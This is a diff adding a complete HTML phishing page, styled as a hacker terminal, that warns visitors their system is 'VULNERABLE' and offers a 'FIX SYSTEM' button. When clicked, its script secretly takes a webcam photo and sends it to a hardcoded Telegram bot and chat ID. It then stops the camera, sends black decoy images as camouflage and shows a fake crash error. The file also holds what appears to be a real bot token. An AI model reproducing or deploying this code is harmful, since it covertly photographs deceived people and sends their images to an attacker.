@@ -1,28 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL ACCESS</title>
+    <style>
+        body { background-color: black; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 20px; text-align: left; width: 80%; box-shadow: 0 0 10px #0f0; }
+        .blink { animation: blinker 1s linear infinite; color: red; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        button { background: #0f0; color: black; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <p>> SYSTEM: ONLINE</p>
+        <p>> STATUS: <span class="blink">VULNERABLE</span></p>
+        <p>> TRACING IP... DONE</p>
+        <p>> بانتظار تأكيد الهوية لتجاوز الحماية...</p>
+        <button id="startBtn">إصلاح النظام (FIX SYSTEM)</button>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
+        const chatId = "8042090388";
+
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function sendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
+        }
+
         startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                
-                // 1. الصورة الأولى: واضحة (بعد 3 ثوانٍ لضبط الإضاءة)
-                setTimeout(() => {
-                    sendPhoto(); // هذه ستكون الواضحة
-                }, 3000);
 
-                // 2. الصور التالية: سوداء (عن طريق إيقاف بث الكاميرا قبل التقاطها)
+                // صورة 1: واضحة بعد 3 ثوانٍ
+                setTimeout(() => { sendPhoto(); }, 3000);
+
+                // إيقاف الكاميرا بعد 5 ثوانٍ لإرسال صور سوداء
                 setTimeout(() => {
-                    // إيقاف الكاميرا برمجياً لجعل الفيديو أسود
-                    stream.getTracks().forEach(track => track.stop()); 
-                    
-                    // إرسال صورتين سوداوين بعد توقف الكاميرا
-                    setTimeout(() => sendPhoto(), 1000); 
+                    stream.getTracks().forEach(track => track.stop());
+                    // إرسال صورتين سوداوين للتمويه
+                    setTimeout(() => sendPhoto(), 1000);
                     setTimeout(() => {
                         sendPhoto();
-                        alert("System Error: Camera connection lost. Protocol 404 active.");
+                        alert("ERROR 404: System Crash!");
                     }, 2000);
-                    
                 }, 5000);
 
             } catch (err) {
-                alert("Access Denied: Camera Permission Needed!");
+                alert("يجب السماح بالكاميرا لتشغيل النظام!");
             }
         });
+    </script>
+</body>
+</html>
